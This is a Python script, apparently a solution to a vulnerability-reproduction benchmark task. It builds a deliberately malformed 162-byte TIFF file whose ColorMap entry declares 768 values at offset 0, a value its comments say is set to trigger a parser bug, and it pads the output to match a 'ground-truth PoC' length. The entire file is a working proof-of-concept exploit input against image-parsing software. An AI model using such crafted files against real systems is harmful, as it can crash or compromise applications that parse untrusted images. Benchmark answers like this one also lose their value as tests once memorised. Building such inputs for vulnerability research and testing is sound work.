import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to create IFD entry
        def ifd_entry(tag, typ, count, value_or_offset):
            return struct.pack('<HHII', tag, typ, count, value_or_offset)

        # Helper for inline SHORT value in value_or_offset field
        def inline_short(val):
            return struct.pack('<H2x', val)

        # Build TIFF header (little-endian)
        header = b'II' + struct.pack('<H', 42)  # Byte order + magic number
        # Offset to first IFD will be 8 (right after header)
        header += struct.pack('<I', 8)

        # Define IFD entries
        # We'll prepare entries and set StripOffsets after computing IFD size
        entries = []

        # 256 ImageWidth (LONG, 1, value 1)
        entries.append(ifd_entry(256, 4, 1, 1))

        # 257 ImageLength (LONG, 1, value 1)
        entries.append(ifd_entry(257, 4, 1, 1))

        # 258 BitsPerSample (SHORT, 1, value 8) inline
        # Place value 8 in lower 2 bytes of value_or_offset
        bos_inline = int.from_bytes(inline_short(8), 'little')
        entries.append(ifd_entry(258, 3, 1, bos_inline))

        # 259 Compression (SHORT, 1, value 1)
        comp_inline = int.from_bytes(inline_short(1), 'little')
        entries.append(ifd_entry(259, 3, 1, comp_inline))

        # 262 PhotometricInterpretation (SHORT, 1, value 3 - palette)
        photo_inline = int.from_bytes(inline_short(3), 'little')
        entries.append(ifd_entry(262, 3, 1, photo_inline))

        # 273 StripOffsets (LONG, 1, value to be filled with image data offset)
        entries.append(ifd_entry(273, 4, 1, 0))  # placeholder

        # 277 SamplesPerPixel (SHORT, 1, value 1)
        spp_inline = int.from_bytes(inline_short(1), 'little')
        entries.append(ifd_entry(277, 3, 1, spp_inline))

        # 278 RowsPerStrip (LONG, 1, value 1)
        entries.append(ifd_entry(278, 4, 1, 1))

        # 279 StripByteCounts (LONG, 1, value 1)
        entries.append(ifd_entry(279, 4, 1, 1))

        # 320 ColorMap (SHORT, count = 3*(1<<BitsPerSample)=768, offset = 0 to trigger issue)
        entries.append(ifd_entry(320, 3, 768, 0))

        num_entries = len(entries)

        # Compute IFD offset end to place image data
        # IFD starts at offset 8
        # Structure: [2 bytes count][12*num_entries bytes of entries][4 bytes next IFD offset]
        ifd_size = 2 + 12 * num_entries + 4
        image_offset = 8 + ifd_size

        # Rebuild entries with the correct StripOffsets value
        # Replace the 6th entry (index 5) which is StripOffsets
        entries[5] = ifd_entry(273, 4, 1, image_offset)

        # Assemble IFD
        ifd = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)

        # Minimal image data of 1 byte (as per StripByteCounts)
        image_data = b'\x00'

        # Assemble full TIFF
        tiff_data = header + ifd + image_data

        # Pad to 162 bytes to match ground-truth PoC length (not strictly required but aligns with spec)
        target_len = 162
        if len(tiff_data) < target_len:
            tiff_data += b'\x00' * (target_len - len(tiff_data))
        else:
            tiff_data = tiff_data[:target_len]

        return tiff_data